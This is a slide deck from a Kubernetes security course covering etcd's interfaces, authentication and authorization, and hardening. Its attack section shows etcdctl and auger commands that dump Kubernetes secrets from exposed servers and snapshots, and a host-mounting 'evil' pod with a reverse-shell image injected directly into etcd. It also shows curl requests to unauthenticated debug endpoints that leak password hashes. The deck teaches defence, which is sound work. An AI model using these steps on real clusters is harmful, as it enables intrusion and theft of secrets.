---
SPDX-FileCopyrightText: © 2025 Menacit AB <foss@menacit.se>
SPDX-License-Identifier: CC-BY-SA-4.0

title: "Kubernetes security course: etcd component deep dive"
author: "Joel Rangsmo <joel@menacit.se>"
footer: "© Course authors (CC BY-SA 4.0)"
description: "Presentation about etcd for Kubernetes security course"
keywords:
  - "kubernetes"
  - "k8s"
  - "security"
color: "#ffffff"
class:
  - "invert"
style: |
  section.center {
    text-align: center;
  }

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Rob Hurson (CC BY-SA 2.0)" -->
# etcd
### Component deep dive

![bg right:30%](images/bunker_tower.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Rob Hurson (CC BY-SA 2.0)" -->
Highly available key-value store written in Go.

Used by API server for persistent storage
of resource definitions and similar.

Popular choice in the "cloud-native ecosystem".  
  
If etcd is compromised, the Kubernetes
cluster is compromised\*.

![bg right:30%](images/bunker_tower.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% ESO / José Francisco Salgado (CC BY 2.0)" -->
Can expose three different network listeners.

The **client interface** (2379/TCP) is used
by applications like the API server to
query and store data.

The **peer interface** (2380/TCP) is used
to communicate between cluster peers.

The **metrics interface** (no default)
may be enabled to expose operational
monitoring data on a dedicated port.
  
Different support for authentication
and authorization mechanisms.

![bg right:30%](images/snow_la_silla.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Reid Campbell (CC0 1.0)" -->
Let's focus on the **client interface** first!

![bg right:30%](images/forest_dome.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Reid Campbell (CC0 1.0)" -->
Different protocol/API versions available.

V2 is HTTP(S) \+ JSON, deprecated and
disabled by default since 2019 (v3.4).

V3 is based on [gRPC](https://en.wikipedia.org/wiki/GRPC), proxy available
to provide HTTP \+ JSON access.

The following slides focus on V3.

![bg right:30%](images/forest_dome.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Cory Doctorow (CC BY-SA 2.0)" -->
TLS **may** be used to protect
traffic between clients and etcd.

Exposes options for acceptable TLS
protocol versions and cipher suites
(defaults depend on Go version/configuration).

Avoid the `--auto-tls-mode` flag
(basically self-signed certificates).

![bg right:30%](images/peeling_arch.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Dennis van Zuijlekom (CC BY-SA 2.0)" -->
## Authentication options
- None (AKA "YOLO")
- Username \+ password
- Token (stateful or JWT)
- mTLS (AKA "client certificate")

![bg right:30%](images/lock_pin_closeup.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Halfrain (CC BY-SA 2.0)" -->
## mTLS / "client certificate"
Client present an X.509 certificate,
must include "client authentication"
in "extended key usage" property.

Most commonly used option, simple to
configure and minimizes attack surface.

Supports revocation using CRL file.

CN is parsed and utilized as username.

![bg right:30%](images/red_windows_glow.jpg)

<!--
- Server validates EKU
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Halfrain (CC BY-SA 2.0)" -->
Not supported by HTTP \+ JSON proxy.

All certificates with appropriate EKU
signed by the trusted CA will be accepted.

To restrict access, administrators may...

- Setup and utilize a dedicated CA
- Specify `--client-cert-allowed-hostname=foo`
- Enabled and configure authorization checks

![bg right:30%](images/red_windows_glow.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Brendan J (CC BY 2.0)" -->
## Username \+ password
Users are created through admin API
exposed on the client interface.

Passwords stored using bcrypt
(cost 10 by default, adjustable).

No complexity requirements or
self-service password change.

Functionality depends on enabling
"authentication/authorization mode"
(more about that later).

Send credentials to API endpoint, get token.

![bg right:30%](images/rusty_forest_key.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Julie Cotinaud (CC BY-SA 2.0)" -->
## Token authentication
By default, "stateful tokens" are used.

Homegrown solution, 16 characters A-Za-z
from CSPRNG, valid for five minutes.

Configurable option to use JWTs instead,
depends on [third-party "golang-jwt" library](https://golang-jwt.github.io/jwt/).

Supports symmetrically and
asymmetrically protected tokens.

Third-party could issue JWTs, in theory.

![bg right:30%](images/dice_boxes.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Nicholas A. Tonelli (CC BY 2.0)" -->
Beware that username \+ password takes
precedence over "client certificate".

If both are provided and valid,
submitted username will be utilized
instead of CN from certificate.

![bg right:30%](images/red_eft.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Adam Lusch (CC BY-SA 2.0)" -->
Let's talk about user authorization!

![bg right:30%](images/hudson_yards.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Adam Lusch (CC BY-SA 2.0)" -->
Supports **R**ole-**B**ased **A**ccess **C**ontrol.  
  
Roles are granted read, write or read-write
access to a specific key or "key prefix".

`/my_app/customers` VS `/my_app/`.

Users can be assigned one or more roles.

If mTLS/"client certificates" are used, a
(passwordless) "mirror user" must be created.

![bg right:30%](images/hudson_yards.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Austin Design (CC BY-SA 2.0)" -->
Both username \+ password/token authentication
and authorization depend on the "auth module"
being configured and enabled.

It's configured using an API exposed through
the client interface, not a file on disk.

Unless mTLS is enforced, etcd must first
be exposed without any authN/authZ.

A role and user called "root" is required.

![bg right:30%](images/cave_searching.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Austin Design (CC BY-SA 2.0)" -->
The "auth module" doesn't seem widely used.  
  
Historically affected by vulnerabilities
like [CVE-2021-28235](https://nvd.nist.gov/vuln/detail/cve-2021-28235) and
[CVE-2023-32082](https://nvd.nist.gov/vuln/detail/cve-2023-32082).
  
Kubernetes API server support mTLS
for client authentication against etcd.

Considering the risks and complexities,
you should probably setup a dedicated
etcd cluster for Kubernetes.

If you need to manage multiple ones,
have a look at ["etcd-operator"](https://github.com/etcd-io/etcd-operator).

![bg right:30%](images/cave_searching.jpg)

<!--
-->

---
```
$ export ETCDCTL_API=3
$ export ETCDCTL_ENDPOINTS=https://kv.example.com:2379
$ export ETCDCTL_CACERT=ca.crt
$ export ETCDCTL_CERT=ada.crt
$ export ETCDCTL_KEY=ada.key

$ etcdctl endpoint health

kv.example.com:2379 is healthy:
successfully committed proposal: took = 2.014439ms
```

<!--
-->

---
```
$ etcdctl role add root
$ etcdctl user add root --no-password
$ etcdctl user grant-role root root

$ etcdctl user add ada --no-password
$ etcdctl user grant-role ada root

$ etcdctl auth enable
```

<!--
-->

---
```
$ etcdctl role add kubernetes
$ etcdctl role grat-permission kubernetes --prefix=true /registry/
$ etcdctl user add apiserver --no-password
$ etcdctl user grant-role apiserver kubernetes

$ etcdctl role add myservice
$ etcdctl role grat-permission myservice /somesettings
$ etcdctl user add otherapp --no-password
$ etcdctl user grant-role otherapp myservice
```

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Pelle Sten (CC BY 2.0)" -->
Let's switch our focus to
the **peer interface**.

![bg right:30%](images/node_spheres.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Pelle Sten (CC BY 2.0)" -->
Must be accessible by all cluster peers.

TLS **may** be used to protect communication,
supports similar options as client interface
(cipher suites, TLS protocol versions, etc.).

Authentication: none or mTLS.

Validation against CRL file and optional
access restriction based on fixed/shared
CN in peer certificates.

No authorization support,
all peers are treated equally.

![bg right:30%](images/node_spheres.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Ted Eytan (CC BY-SA 2.0)" -->
...and finally, the **metrics interface**.

![bg right:30%](images/teardown_wall.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Ted Eytan (CC BY-SA 2.0)" -->
Provides health check endpoints and
(not so sensitive) operational metrics.

Disabled by default, information exposed
through the client interface instead.  
  
Limit attack surface and complexity.  
  
Enable monitoring using software without
support for mTLS authentication.

![bg right:30%](images/teardown_wall.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Ted Eytan (CC BY-SA 2.0)" -->
Clear-text HTTP without authentication
or TLS with settings inherited
from the client interface.

...which [may result in mTLS being enforced](https://github.com/etcd-io/etcd/issues/18477).

![bg right:30%](images/teardown_wall.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Jeena Paradies (CC BY 2.0)" -->
With all that said, let's get hacking!

Found an exposed etcd server?
Perhaps even some credentials?

To access the client interface,
we'll simply use `etcdctl`.

To encode/decode data in the
binary format used by Kubernetes,
a tool like ["auger"](https://github.com/etcd-io/auger) is needed.

![bg right:30%](images/orange_stones.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Marcin Wichary (CC BY 2.0)" -->
```
$ etcdctl \
    get --keys-only --prefix \
    /registry/secrets/

/registry/secrets/alpha-ns/s1
/registry/secrets/alpha-ns/s2
/registry/secrets/bravo-ns/s1
[...]
```

![bg right:30%](images/difference_engine.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Marcin Wichary (CC BY 2.0)" -->
```
$ etcdctl \
    get \
    /registry/secrets/bravo-ns/s1 \
  | auger decode

apiVersion: v1
kind: Secret
data:
  private_key: LS0tLS1CRUd[...]
```
(can partly mitigate the risk by using
Kubernetes "at-rest encryption" feature,
more about that in following presentations)

![bg right:30%](images/difference_engine.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Price Capsule (CC BY-SA 2.0)" -->
### evil\_pod.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
  uid: deadbeef
  name: evil
  namespace: bravo-ns
  creationTimestamp: null
spec:
  nodeName: master-1
  containers:
    - image: rev_shell:v1
      name: evil
      volumeMounts:
        - mountPath: /host
          name: host-root
  volumes:
    - name: host-root
      hostPath:
        path: /
status: {}
```

![bg right:30%](images/desert_truss_hut.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Price Capsule (CC BY-SA 2.0)" -->
```
$ cat evil_pod.yaml \
  | auger encode \
  | etcdctl \
      put \
      /registry/pods/bravo-ns/evil
```

(bypasses admission controllers
and all scheduling restrictions)

![bg right:30%](images/desert_truss_hut.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Austin Design (CC BY-SA 2.0)" -->
Perhaps you've found an
etcd snapshot lying around?
(basically a backup file)  
  
May be handled in-cluster by a tool
like [gardener's etcd-backup-restore](https://github.com/gardener/etcd-backup-restore),
nice privilege escalation path!  

Help you stay sneaky and
hide what you're looking for.

![bg right:30%](images/crystal_wave.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Austin Design (CC BY-SA 2.0)" -->
```
$ etcdctl snapshot save dump.bbolt

$ auger analyze -f dump.bbolt

Total kubernetes objects: 901
Total (all revisions) storage
used by kubernetes objects: 2710835

Most common kubernetes types:
556     v1/Event
48      v1/Pod
[...]
```

![bg right:30%](images/crystal_wave.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Austin Design (CC BY-SA 2.0)" -->
```
$ auger \
    -f etcd.snapshot \
    extract --fields=key \
  | grep /secrets/

/registry/secrets/alpha-ns/s1
/registry/secrets/alpha-ns/s2
/registry/secrets/bravo-ns/s1
[...]
```

![bg right:30%](images/crystal_wave.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Austin Design (CC BY-SA 2.0)" -->
```
$ auger \
    -f etcd.snapshot \
    extract -k \
    /registry/secrets/bravo-ns/s1 \

apiVersion: v1
kind: Secret
data:
  private_key: LS0tLS1CRUd[...]
```

![bg right:30%](images/crystal_wave.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Helsinki Hacklab (CC BY 2.0)" -->
Even without credentials, we may be
able to access some "debug endpoints".  
  
No authentication or authorization,
unless mTLS is enforced.  

![bg right:30%](images/neon_umbrellas.jpg)

<!--
-->

---
```
$ curl -k https://kv.example.com:2379/debug/vars

{
  "file_descriptor_limit": 1048576,
  "raft.status": {
    "lead": "3debe8aca9e51ef9",
    "raftState": "StateFollower",
    [...]
  }
  "cmdline": [
    "etcd",
    "--data-dir=/var/lib/etcd",
    "--name=master-1",
    "--listen-peer-urls=http://10.13.38.11:2380",
    "--experimental-initial-corrupt-check=true",
    [...]
  ]
}
```

(always available, no juicy command line flags as of etcd version 3.5)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Helsinki Hacklab (CC BY 2.0)" -->
With some configuration tweaks, we may
enable profiling endpoints ("pprof").

Disabled by default, except in
the [example configuration file](https://github.com/etcd-io/etcd/blob/5813dce9ad1a9e31d9b51d199d374e68d233e439/etcd.conf.yml.sample#L74).

Nothing all that exciting -
not great, not terrible.

If server log level is set to "debug",
profiling and **tracing** endpoints
are [automatically enabled](https://github.com/etcd-io/etcd/blob/8f933a5b5867d078c714fd6a9584aa47f450d8d0/server/embed/etcd.go#L743-L748)! _:S_

![bg right:30%](images/neon_umbrellas.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Fibreman (CC0 1.0)" -->
```
$ curl \
    'https://kv.example.com:2379/debug/ ↴
    requests?fam=grpc.Recv.etcdserverpb.KV ↴
    &b=0&exp=1&rtraced=0'

[...]
<tr>                         
  <td class="when">12:16:09.789316</td>
  <td>
    ... recv: compare:&lt;target:MOD key:&#34
    /registry/pods/default/sensitive-pod-name-3
    &#34; mod_revision:16199 &gt; suc
  </td>       
</tr>
[...]
```

![bg right:30%](images/horizontal_line_laser.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Steve Jurvetson (CC BY 2.0)" -->
```
$ curl \
    'https://kv.example.com:2379/debug/ ↴
    requests?fam=grpc.Recv.etcdserverpb.Auth ↴
    &b=0&exp=1

[...]
<tr>
  <td class="when">12:21:33.504248</td>
  <td>
    ... recv: name:&#34;root&#34;
    options:&lt;&gt;
    hashedPassword:&#34;JDJhJDE[...]1BRVRQcVB
  </td>
</tr>
[...]
```

(possible to extract clear-text passwords
before [CVE-2021-28235](https://nvd.nist.gov/vuln/detail/cve-2021-28235) was fixed)

![bg right:30%](images/desert_neon_pyramid.jpg)

<!--
- Logged during password change of root account
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Bill Badzo (CC BY-SA 2.0)" -->
## Hardening and mitigations
Restrict network communication, only permit
control plane nodes to access client interface.

Avoid risks and complexity, setup a
dedicated etcd cluster for Kubernetes.

Enforce mTLS authentication with a
dedicated CA for client/peer interfaces.

Utilize a dedicated metrics interface,
if you can live with clear-text HTTP.

Run backup software locally on the etcd
hosts, alternatively on control plane nodes.

![bg right:30%](images/keenan_building.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Sergei Gussev (CC BY 2.0)" -->
Consider monitoring and alerting of...

- Failed authentication attempts
- Failed authorization attempts
- Blocked traffic against interfaces
- Snapshots by unexpected users

![bg right:30%](images/singapore_gardens_pond.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Nicholas A. Tonelli (CC BY 2.0)" -->
## Incident recovery
Somewhat futile task, consider setting up
a clean etcd and Kubernetes cluster.

Revoke certificates used by etcd peers
and generate/distribute CRL file.

Treat stored data as compromised,
rotate all Kubernetes secrets.

The "at-rest encryption" feature may help,
but an attacker with write-access could
have injected pods to decrypt them.

![bg right:30%](images/forest_stone_hedge.jpg)

<!--
-->

---
<!-- _footer: "%ATTRIBUTION_PREFIX% Rob Hurson (CC BY-SA 2.0)" -->
## Wrapping up

![bg right:30%](images/bunker_tower.jpg)

<!--
-->
